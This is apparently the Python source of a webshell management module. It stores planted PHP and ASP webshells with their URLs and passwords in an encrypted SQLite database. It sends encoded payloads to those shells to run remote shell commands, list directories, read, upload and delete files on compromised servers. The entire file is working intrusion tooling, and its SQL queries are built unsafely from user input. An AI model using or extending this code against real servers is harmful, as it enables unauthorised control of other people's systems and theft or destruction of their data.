#encoding:utf-8
from Mod.Core import *
import sqlite3
import os
import urllib
import base64

DbConn = None
DbCur  = None
Pwd = "."
Password = ""
System = "Linux"
Shell_Url = ""
Shell_Type = ""
Shell_Pass = ""
Shell_Method = ""
MainCommandList = None

def DelCache():
    try:
        os.remove("./Data/shells_d.db")
    except Exception,e:
        pass

def PromptInit():
    if System == "Windows":
        Core.Controller.Prompt = Pwd + ">"
    else:
        Core.Controller.Prompt = Pwd + "$"

def DbCommit():
    global DbConn
    DbConn.commit()
    Core.Rc4.Rc4File("./Data/shells_d.db", "./Data/shells.db", Password)

def PasswordChange(newPass):
    global Password
    Password = newPass
    DbCommit()

def AddGroup(name):
    DbCur.execute("insert into SGroup values('%s');" % name)
    DbCommit()
    print "Shells group successfully added."

def AddShell():
    group = raw_input("Group(default):")
    if group == '': group = "default"
    DbCur.execute("select * from SGroup where name='%s';" % group)
    if DbCur.fetchone() == None:
        print "Error! group not found."
        return
    name = raw_input("Name:")
    if name == '':
        print "Error! Can not be empty."
        return

    DbCur.execute("select * from Shell where name='%s';" % name)
    if DbCur.fetchone() != None:
        print "Error! Name already exists."
        return

    url = raw_input("Url:")
    if url == '':
        print "Error! Can not be empty."
        return

    method = raw_input("Method(POST/GET):")
    method = method.upper()
    if method != "GET" and method != "POST":
        print "Error! Method"
        return
    
    stype = raw_input("Type(PHP/ASP):")
    stype = stype.upper()
    if stype != "PHP" and stype != "ASP":
        print "Error! Type"
        return
    password = raw_input("Password:")
    if password == '':
        print "Error! Can not be empty."
        return
    

    DbCur.execute("insert into Shell values(NULL,'%s','%s','%s','%s','%s', '%s');" % (name, group, url, method, stype, password))
    DbCommit()
    print "Shell successfully added."

def DelGroup(name):
    DbCur.execute("delete from SGroup where name='%s';" % name)
    DbCommit()
    print "Shells group successfully deleted."

def ShowGroups():
    for c in DbCur.execute("select * from SGroup;"):
        print c[0]


def ShowShells():
    for c in DbCur.execute("select * from Shell;"):
        print "ID:%s Name:%s  Group:%s  Url:%s  Method:%s  Type:%s" % (c[0],c[1],c[2],c[3],c[4],c[5])


def Shell_Info_PHP():
    global Pwd
    global System
    System = ""

    php_head = Core.Config.GetConfig("SM","shellcode","php_head")
    php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
    shellcode = Shell_Pass + "=" + urllib.quote(php_head)

    php_info = Core.Config.GetConfig("SM","shellcode","php_info")
    shellcode += "&x0=" +  urllib.quote(base64.b64encode(php_info+php_tail))

    sendData = shellcode
    if Shell_Method == "GET":
        url = url + "?" + sendData
    
    httpClient = Core.Http.HttpClient(Shell_Url)
    httpClient.Method = Shell_Method
    httpClient.PostData = sendData
    retContent = httpClient.GetString()
    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
    if retContent == "":
        print retContent
        return

    retInfo = retContent.split("\t")
    Pwd = retInfo[0]
    driveInfo = retInfo[1]
    SystemInfo = retInfo[2]
    print "Win_DriveInfo:%s\r\nSystemInfo:%s" % (driveInfo,SystemInfo)
    if SystemInfo.find("Windows") >= 0:
        global Shell_Bin
        System = "Windows"
        Pwd = Pwd.replace("/","\\")

def Shell_Info_ASP():
    global Pwd
    asp_head = Core.Config.GetConfig("SM","shellcode","asp_head")
    asp_tail = Core.Config.GetConfig("SM","shellcode","asp_tail")
    shellcode = Shell_Pass + "=" + asp_head

    asp_info = Core.Config.GetConfig("SM","shellcode","asp_info")
    shellcode += asp_info.encode("hex") + asp_tail

    sendData = shellcode
    if Shell_Method == "GET":
        url = url + "?" + sendData
    
    httpClient = Core.Http.HttpClient(Shell_Url)
    httpClient.Method = Shell_Method
    httpClient.PostData = sendData
    retContent = httpClient.GetString()

    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
    if retContent == "":
        print retContent
        return

    retInfo = retContent.split("\t")
    Pwd = retInfo[0]
    driveInfo = retInfo[1]
    print "Win_DriveInfo:%s" % driveInfo
    global System
    global Shell_Bin
    System = "Windows"
    Pwd = Pwd.replace("/","\\")

def Shell_Info():
    if Shell_Type == "PHP":
        return Shell_Info_PHP()
    if Shell_Type == "ASP":
        return Shell_Info_ASP()
    else:
        print "Faild type!"


def Shell_Cmd_PHP(cmd):
    global Pwd
    php_head = Core.Config.GetConfig("SM","shellcode","php_head")
    php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
    shellcode = Shell_Pass + "=" + urllib.quote(php_head)
    
    php_cmd = Core.Config.GetConfig("SM","shellcode","php_cmd")

    shell_bin = "/bin/sh"
    shell_cmd = 'cd "%s";%s;echo [S];pwd;echo [E]' % (Pwd, cmd)

    if System == "Windows":
        shell_bin = "cmd"
        shell_cmd = 'cd /d "%s"&%s&echo [S]&cd&echo [E]' % (Pwd, cmd)

    php_cmd = php_cmd.replace("#shell_bin#", base64.b64encode(shell_bin))
    php_cmd = php_cmd.replace("#shell_cmd#", base64.b64encode(shell_cmd))

    shellcode += "&x0=" + urllib.quote(base64.b64encode(php_cmd+php_tail))

    sendData = shellcode
    #print sendData
    if Shell_Method == "GET":
            url = url + "?" + sendData

    httpClient = Core.Http.HttpClient(Shell_Url)
    httpClient.Method = Shell_Method
    httpClient.PostData = sendData
    try:
        retContent =  httpClient.GetString()
    except Exception,e:
        print e
        return

    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
    
    echo = "Remote command faild!"

    if retContent != "":
        if retContent.find("[S]") >= 0:
            if retContent.find("[S]") == 0:
                echo = ""
            else:
                echo = retContent[:retContent.find("[S]")-1]
        Pwd = retContent[retContent.find("[S]")+4:retContent.find("[E]")-1]
        Pwd = Pwd.replace("\r","")
        Pwd = Pwd.replace("\n","")

        PromptInit()

    return echo

def Shell_Cmd_ASP(cmd):
    global Pwd
    asp_head = Core.Config.GetConfig("SM","shellcode","asp_head")
    asp_tail = Core.Config.GetConfig("SM","shellcode","asp_tail")
    shellcode = Shell_Pass + "=" + asp_head

    shell_cmd = 'cd /d "%s"&%s&echo [S]&cd&echo [E]' % (Pwd,cmd)
    asp_cmd = Core.Config.GetConfig("SM","shellcode","asp_cmd")
    asp_cmd = asp_cmd.replace("#shell_cmd#", shell_cmd.encode("hex"))

    shellcode += asp_cmd.encode("hex") + asp_tail

    sendData = shellcode
    #print sendData
    if Shell_Method == "GET":
            url = url + "?" + sendData

    httpClient = Core.Http.HttpClient(Shell_Url)
    httpClient.Method = Shell_Method
    httpClient.PostData = sendData
    try:
        retContent =  httpClient.GetString()
    except Exception,e:
        print e
        return

    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
    
    echo = "Remote command faild!"

    if retContent != "":
        if retContent.find("[S]") >= 0:
            if retContent.find("[S]") == 0:
                echo = ""
            else:
                echo = retContent[:retContent.find("[S]")-1]
        Pwd = retContent[retContent.find("[S]")+4:retContent.find("[E]")-1]
        Pwd = Pwd.replace("\r","")
        Pwd = Pwd.replace("\n","")

        PromptInit()

    return echo

    

def Shell_Cmd(cmd):
    if Shell_Type == "PHP":
        return Shell_Cmd_PHP(cmd)
    elif Shell_Type == "ASP":
        return Shell_Cmd_ASP(cmd)
    else:
        print "Faild type!"
    

def Shell_Cmd_Exit():
    Core.Command.CommandList = MainCommandList
    Core.Controller.Prompt = ">"

def DirChange(path):
    global Pwd

    if System == "Windows":
        sep = "\\"
    else:
        sep = "/"

    if path == "..":
        if Pwd[len(Pwd)-1:] != ":":
                pwd = ""
                pwd = Pwd[:len(Pwd)-1]

        Pwd = Pwd[:pwd.rfind(sep)] + sep
        PromptInit()
        return
    
    if path != "":
        if System == "Windows":
            if path.find(":") > 0:
                Pwd = path
                PromptInit()
                return
        else:
            if path[0:1] == "/":
                Pwd = path
                PromptInit()
                return

def Shell_List_ASP():
    asp_head = Core.Config.GetConfig("SM","shellcode","asp_head")
    asp_tail = Core.Config.GetConfig("SM","shellcode","asp_tail")
    asp_list = Core.Config.GetConfig("SM","shellcode","asp_list")
    asp_list = asp_list.replace("#shell_path#", Pwd.encode("hex"))
    shellcode = Shell_Pass + "=" + asp_head
    shellcode += asp_list.encode("hex") + asp_tail
    
    sendData = shellcode
    #print sendData
    if Shell_Method == "GET":
            url = url + "?" + sendData

    httpClient = Core.Http.HttpClient(Shell_Url)
    httpClient.Method = Shell_Method
    httpClient.PostData = sendData
    try:
        retContent =  httpClient.GetString()
    except Exception,e:
        print e
        return

    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
    return retContent

def Shell_List_PHP():
    php_head = Core.Config.GetConfig("SM","shellcode","php_head")
    php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
    php_list = Core.Config.GetConfig("SM","shellcode","php_list")
    php_list = php_list.replace("#shell_path#", base64.b64encode(Pwd))
    shellcode = Shell_Pass + "=" + urllib.quote(php_head)
    shellcode += "&x0=" + urllib.quote(base64.b64encode(php_list+php_tail))

    sendData = shellcode
    #print sendData
    if Shell_Method == "GET":
            url = url + "?" + sendData

    httpClient = Core.Http.HttpClient(Shell_Url)
    httpClient.Method = Shell_Method
    httpClient.PostData = sendData
    try:
        retContent =  httpClient.GetString()
    except Exception,e:
        print e
        return

    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
    retContent = retContent.replace("\\t","\t")
    return retContent

def Shell_List():
    if Shell_Type == "PHP":
        print Shell_List_PHP()
    elif Shell_Type == "ASP":
        print Shell_List_ASP()
    else:
        print "Faild type!"

def Shell_Read_PHP(filename):
    if System == "Windows":
        if filename.find(":") < 0:
            filename = Pwd + "\\" + filename
    else:
        if filename[0:1] != "/":
            filename = Pwd + "/" + filename

    php_head = Core.Config.GetConfig("SM","shellcode","php_head")
    php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
    php_read = Core.Config.GetConfig("SM","shellcode","php_read")
    php_read = php_read.replace("#shell_file#", base64.b64encode(filename))
    shellcode = Shell_Pass + "=" + urllib.quote(php_head)
    shellcode += "&x0=" + urllib.quote(base64.b64encode(php_read+php_tail))
    
    sendData = shellcode
    #print sendData
    if Shell_Method == "GET":
            url = url + "?" + sendData

    httpClient = Core.Http.HttpClient(Shell_Url)
    httpClient.Method = Shell_Method
    httpClient.PostData = sendData
    try:
        retContent =  httpClient.GetString()
    except Exception,e:
        print e
        return

    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
    retContent = retContent.replace("\\t","\t")
    return retContent

def Shell_Read_ASP(filename):
    if filename.find(":") < 0:
        filename = Pwd + "\\" + filename
    asp_head = Core.Config.GetConfig("SM","shellcode","asp_head")
    asp_tail = Core.Config.GetConfig("SM","shellcode","asp_tail") 
    asp_read = Core.Config.GetConfig("SM","shellcode","asp_read")
    asp_read = asp_read.replace("#shell_file#", filename.encode("hex"))
    shellcode = Shell_Pass + "=" + asp_head
    shellcode += asp_read.encode("hex") + asp_tail

    sendData = shellcode
    #print sendData
    if Shell_Method == "GET":
            url = url + "?" + sendData

    httpClient = Core.Http.HttpClient(Shell_Url)
    httpClient.Method = Shell_Method
    httpClient.PostData = sendData
    try:
        retContent =  httpClient.GetString()
    except Exception,e:
        print e
        return

    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
    retContent = retContent.replace("\\t","\t")
    return retContent

def Shell_Read(filename):
    if Shell_Type == "PHP":
        print Shell_Read_PHP(filename)
    elif Shell_Type == "ASP":
        print Shell_Read_ASP(filename)
    else:
        print "Faild type!"

def Shell_Up_PHP(filename,localfile):
    if System == "Windows":
        if filename.find(":") < 0:
            filename = Pwd + "\\" + filename
    else:
        if filename[0:1] != "/":
            filename = Pwd + "/" + filename

    php_head = Core.Config.GetConfig("SM","shellcode","php_head") 
    php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
    php_up   = Core.Config.GetConfig("SM","shellcode","php_up")
    php_up   = php_up.replace("#shell_file#", base64.b64encode(filename))

    f = open(localfile,"rb")
    fdata = f.readlines()
    hexdata = ""
    for l in fdata:
        hexdata += l.encode("hex")

    fdata = None
    f.close()

    php_up = php_up.replace("#shell_data#", hexdata)
    shellcode = Shell_Pass + "=" + urllib.quote(php_head)
    shellcode += "&x0=" + urllib.quote(base64.b64encode(php_up+php_tail))
    
    sendData = shellcode
    #print sendData
    if Shell_Method == "GET":
            url = url + "?" + sendData

    httpClient = Core.Http.HttpClient(Shell_Url)
    httpClient.Method = Shell_Method
    httpClient.PostData = sendData
    try:
        retContent =  httpClient.GetString()
    except Exception,e:
        print e
        return

    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
    retContent = retContent.replace("\\t","\t")
    hexdata = ""
    return retContent
    

def Shell_Up_ASP(filename, localfile):
    if filename.find(":") < 0:
        filename = Pwd + "\\" + filename
    asp_head = Core.Config.GetConfig("SM","shellcode","asp_head")
    asp_tail = Core.Config.GetConfig("SM","shellcode","asp_tail") 
    asp_up = Core.Config.GetConfig("SM","shellcode","asp_up")
    f = open(localfile,"rb")
    fdata = f.readlines()
    hexdata = ""
    for l in fdata:
        hexdata += l.encode("hex")

    fdata = None
    f.close()

    asp_up = asp_up.replace("#shell_file#", filename.encode("hex"))
    asp_up = asp_up.replace("#shell_data#", hexdata)
    shellcode = Shell_Pass + "=" + asp_head
    shellcode += asp_up.encode("hex") + asp_tail
    
    sendData = shellcode
    #print sendData
    if Shell_Method == "GET":
            url = url + "?" + sendData

    httpClient = Core.Http.HttpClient(Shell_Url)
    httpClient.Method = Shell_Method
    httpClient.PostData = sendData
    try:
        retContent =  httpClient.GetString()
    except Exception,e:
        print e
        return

    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
    retContent = retContent.replace("\\t","\t")
    hexdata = ""
    return retContent

def Shell_Up(filename, localfile):
    if Shell_Type == "PHP":
        ret = Shell_Up_PHP(filename,localfile)
    elif Shell_Type == "ASP":
        ret = Shell_Up_ASP(filename,localfile)
    else:
        print "Faild type!"
        print Shell_Type
        return

    if ret == "1":
        print "Upload successfully!"
    else:
        print "Upload faild!"

def Shell_Del(filename):
    if System == "Windows":
        if filename.find(":") < 0:
            filename = Pwd + "\\" + filename
    else:
        if filename[0:1] != "/":
            filename = Pwd + "/" + filename

    php_head = Core.Config.GetConfig("SM","shellcode","php_head")
    php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
    shellcode = Shell_Pass + "=" + urllib.quote(php_head)

    php_del = Core.Config.GetConfig("SM","shellcode","php_del")
    php_del = php_del.replace("#shell_file#", base64.b64encode(filename))
    shellcode += "&x0=" +  urllib.quote(base64.b64encode(php_del+php_tail))

    sendData = shellcode
    #print sendData
    if Shell_Method == "GET":
            url = url + "?" + sendData

    httpClient = Core.Http.HttpClient(Shell_Url)
    httpClient.Method = Shell_Method
    httpClient.PostData = sendData
    try:
        retContent =  httpClient.GetString()
    except Exception,e:
        print e
        return

    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
    retContent = retContent.replace("\\t","\t")
    print retContent
    return retContent

def OtherCommand(command):
    global Pwd
    cmds = command.split(" ")

    if command != "":
        print Shell_Cmd(command)
    

def UseShell(argv):
    DbCur.execute("select * from Shell where id='%s'" % argv)
    r = DbCur.fetchone()
    if r == None:
        DbCur.execute("select * from Shell where name='%s'" % argv)
        r = DbCur.fetchone()
    
    if r != None:
            global Shell_Url
            global Shell_Method
            global Shell_Type
            global Shell_Pass
            Shell_Url = r[3]
            Shell_Method = r[4]
            Shell_Type = r[5]
            Shell_Pass = r[6]
            global System
            System = ""
            Shell_Info()
                
            global MainCommandList
            MainCommandList = Core.Command.CommandList
            Core.Command.CommandList = []
            Core.Command.CommandAdd("scdir", DirChange, "Change the current directory\r\n   Use:cdir [..|PATH]")
            Core.Command.CommandAdd("slist", Shell_List, "List directory contents")
            Core.Command.CommandAdd("sread", Shell_Read, "Read the file\r\n   Use:sread filename")
            Core.Command.CommandAdd("sdel", Shell_Del, "Delete the file.")
            #Core.Command.CommandAdd("sget", Shell_get, "Get the file")
            Core.Command.CommandAdd("sup", Shell_Up, "Upload the file\r\n   Use:sup filename localfile")
            Core.Command.CommandAdd("exit", Shell_Cmd_Exit, "Exit this shell")
            Core.Command.CommandAdd("help", Core.Command.CommandShow, "Show the command list")
            Core.Command.CommandAdd("other", OtherCommand, "Remote Command")

            if System == "Windows":
                Core.Controller.Prompt = Pwd + ">"
            else:
                Core.Controller.Prompt = Pwd + "$"

def DataInit():
    global DbConn
    global DbCur
    global Password
    import getpass
    DelCache()

    if os.path.exists("./Data/shells.db"):
        Password = getpass.getpass()
        Core.Rc4.Rc4File("./Data/shells.db", "./Data/shells_d.db", Password)
        DbConn = sqlite3.connect("./Data/shells_d.db")
        DbCur = DbConn.cursor()
        try:
            DbCur.execute("select * from SGroup;")
        except Exception, e:
            print "Password error!"
            Core.Controller.Exit()

    else:
        DbConn = sqlite3.connect("./Data/shells_d.db")
        DbCur = DbConn.cursor()
        #Database init
        DbCur.execute("create table SGroup(name text);")
        DbCur.execute("create table Shell(id INTEGER PRIMARY KEY, name text UNIQUE, sgroup text, url text, method varchar(5), stype varchar(5), pass text);")
        DbCur.execute("insert into SGroup values('default');")
        while True:
            Password = getpass.getpass()
            if Password != None:
                break

        DbCommit()



def Init():
    Core.Controller.InitFuns.append(DataInit)
    Core.Command.CommandAdd("add group",AddGroup, "Add shell group.\r\n   Use:add group [name]")
    Core.Command.CommandAdd("add shell", AddShell, "Add shell")
    Core.Command.CommandAdd("show groups", ShowGroups, "Show the shell groups")
    Core.Command.CommandAdd("show shells", ShowShells, "Show the shells list")
    Core.Command.CommandAdd("del group", DelGroup, "Delete the group")
    Core.Command.CommandAdd("use shell", UseShell, "Use the shell\r\n   Use:use shell [id|name]")
    Core.Command.CommandAdd("pass", PasswordChange, "Change the passsword\r\n   Use:pass newpassword")
    Core.Controller.ExitFuns.append(DelCache)
